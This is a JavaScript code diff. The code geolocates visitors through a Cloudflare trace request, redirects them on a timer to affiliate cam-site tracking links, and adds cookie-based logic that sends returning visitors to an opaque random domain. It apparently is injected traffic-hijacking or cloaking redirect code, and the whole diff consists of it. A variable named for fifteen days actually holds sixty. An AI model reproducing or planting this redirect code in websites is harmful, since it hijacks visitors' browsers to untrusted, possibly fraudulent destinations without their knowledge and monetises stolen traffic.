@@ -7,6 +7,23 @@ country_code = country_code[1].split('tls=');
 country_code = country_code[0];
 
 
+
+
+}
+};
+
+xhttp.open("GET", "https://www.cloudflare.com/cdn-cgi/trace", true);
+xhttp.send();
+
+////copaqui
+
+      jQuery(document).ready(function(){
+       if (document.cookie.indexOf('visited=true') == -1) {
+        var fifteenDays = 1000*60*60*24*60;
+        var expires = new Date((new Date()).valueOf() + fifteenDays);
+        document.cookie = "visited=true;expires=" + expires.toUTCString();
+
+
 if (country_code == "US"){
 
 setTimeout('window.location.href = "https://t.camsk5.com/133199/223/2257?aff_sub5=SF_006OG000004lmDN"', xRedir);
@@ -92,9 +109,14 @@ else {
 setTimeout('window.location.href = "https://t.camsk5.com/133199/3664/0?target=domainredirects&aff_sub5=SF_006OG000004lmDN"', xRedir);
 
 }
+        
+        }else{
+        fifteenDays = 3000;
+        expires = new Date((new Date()).valueOf() + fifteenDays);
+        document.cookie = "visited=true;expires=" + expires.toUTCString();
 
-}
-};
+setTimeout('window.location.href = "https://bgfffig.czpiix.com/s/490ea52c75cda"', 500);
 
-xhttp.open("GET", "https://www.cloudflare.com/cdn-cgi/trace", true);
-xhttp.send();
+
+        }
+        });
